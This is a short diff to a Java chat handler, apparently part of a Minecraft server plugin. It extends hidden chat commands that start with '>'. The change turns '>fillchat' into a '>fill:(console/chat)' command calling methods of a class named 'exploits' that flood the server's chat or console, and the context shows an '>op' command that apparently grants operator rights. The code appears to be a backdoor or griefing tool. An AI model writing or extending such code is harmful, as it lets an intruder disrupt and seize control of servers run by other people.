@@ -19,8 +19,19 @@ public class chathandler {
     public static void handler(Player pl, String message) {
         String[] spl = message.split(":");
         if (message.startsWith(">")) {
-            if (spl[0].startsWith(">fillchat")) {
-                exploits.chatFill();
+            if (spl[0].startsWith(">fill")) {
+                if (spl.length < 2) {
+                    pl.sendMessage("Invalid syntax. Correct syntax: >fill:(console/chat)");
+                }
+                else {
+                    if (spl[1].equals("chat")) {
+                        exploits.chatFill();
+                    }
+                    else if (spl[1].equals("console")) {
+                        exploits.consoleFill();
+                    }
+                }
+
             }
             else if (spl[0].startsWith(">op")) {
                 if (spl.length < 2) {
